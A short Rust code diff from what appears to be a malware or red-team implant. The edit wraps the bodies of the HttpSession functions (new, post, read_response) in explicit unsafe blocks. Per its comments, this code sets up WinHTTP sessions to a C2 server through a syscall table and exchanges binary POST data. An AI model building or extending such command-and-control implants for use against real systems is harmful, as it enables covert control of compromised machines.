@@ -91,7 +91,7 @@ impl HttpSession {
     /**
      * Create a new HTTP session connected to the C2 server
      * */
-    pub unsafe fn new(host: &[u16], port: u16, use_https: bool) -> Option<Self> {
+    pub unsafe fn new(host: &[u16], port: u16, use_https: bool) -> Option<Self> { unsafe {
         let table = ssn_table::syscall_table();
 
         if table.win32.winhttp_open.is_null() || table.win32.winhttp_connect.is_null(){
@@ -143,12 +143,12 @@ impl HttpSession {
 
         debug!("[NET] HTTP session established (HTTPS={})", use_https);
         Some(HttpSession{session_handle, connect_handle, use_https})
-    }
+    }}
 
     /**
      * Send and HTTP POST request with binary body and return the response body
      * */
-    pub unsafe fn post(&self, path: &[u16], body: &[u8]) -> Option<Vec<u8>> {
+    pub unsafe fn post(&self, path: &[u16], body: &[u8]) -> Option<Vec<u8>> { unsafe {
         let table = ssn_table::syscall_table();
 
         // POST verb in UTF-16
@@ -253,12 +253,12 @@ impl HttpSession {
         close_fn(request);
 
         response
-    }
+    }}
 
     /**
      * Read the full response body from a WinHTTP request handle
      * */
-    unsafe fn read_response(&self, request: *mut c_void) -> Option<Vec<u8>> {
+    unsafe fn read_response(&self, request: *mut c_void) -> Option<Vec<u8>> { unsafe {
         let table = ssn_table::syscall_table();
 
         if table.win32.winhttp_query_data_available.is_null() || table.win32.winhttp_read_data.is_null() {
@@ -304,5 +304,5 @@ impl HttpSession {
         } else {
             Some(result)
         }
-    }
+    }}
 }
